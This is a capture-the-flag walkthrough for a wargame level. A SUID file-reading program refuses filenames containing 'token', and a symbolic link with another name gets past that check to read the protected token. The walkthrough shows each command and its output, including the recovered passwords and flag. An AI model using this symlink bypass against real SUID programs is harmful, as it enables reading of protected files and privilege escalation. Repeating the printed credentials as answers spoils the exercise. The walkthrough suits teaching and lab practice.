# Level 08 - Bypassing File Access Restrictions

## Step 1: Examine available files

Let's check what files we have in the home directory:

```sh
ls -l
```

Output:
```
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

We see:
- An executable `level08` with SUID permissions (owned by flag08)
- A file named `token` that only flag08 can read

## Step 2: Understand the program

Running the program without arguments:

```sh
./level08
```

Output:
```
./level08 [file to read]
```

It seems the program is designed to read files.

## Step 3: Analyze the binary

Let's examine the strings in the binary:

```sh
strings level08
```

We see interesting output including:
```
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
```

This suggests the program might be blocking access to files with "token" in the name.

## Step 4: Test our hypothesis with ltrace

Using `ltrace` to confirm this behavior:

```sh
ltrace ./level08 stoken
```

Output:
```
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("stoken", "token")                             = "token"
printf("You may not access '%s'\n", "stoken"You may not access 'stoken'
)         = 28
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

We can see that the program:
1. Uses `strstr()` to check if "token" is in the filename
2. Refuses to access files containing that string

Let's try a filename without "token":

```sh
ltrace ./level08 sdfsd
```

Output:
```
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("sdfsd", "token")                              = NULL
open("sdfsd", 0, 014435162522)                        = -1
err(1, 0x80487b2, 0xbffff903, 0xb7fe765d, 0xb7e3ebaflevel08: Unable to open sdfsd: No such file or directory
 <unfinished ...>
+++ exited (status 1) +++
```

Now it attempts to open the file but fails because it doesn't exist.

## Step 5: Understand the vulnerability

The vulnerability is that the program:
1. Checks the filename string to block access to files containing "token"
2. But doesn't check what the file actually points to

This is a classic example of insufficient input validation. We can bypass this by creating a symbolic link to the token file with a different name.

## Step 6: Test the program functionality

Let's confirm that the program reads and displays file content:

```sh
echo "test content" > /tmp/testfile
./level08 /tmp/testfile
```

Output:
```
test content
```

## Step 7: Exploit the vulnerability

We can create a symbolic link to the token file with a name that doesn't include "token":

```sh
ln -s ~/token /tmp/flag_access
```

Now we can use the program to read the token file via our symbolic link:

```sh
./level08 /tmp/flag_access
```

Output:
```
quif5eloekouj29ke0vouxean
```

## Step 8: Use the token to get the flag

Now that we have the token, we can switch to the flag08 user:

```sh
su flag08
Password: quif5eloekouj29ke0vouxean
```

And get the flag:

```sh
getflag
```

Output:
```
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

## Step 9: Proceed to next level

Now we can advance to level09:

```sh
su level09
Password: 25749xKZ8L7DkSCwJkT9dyv6f
```
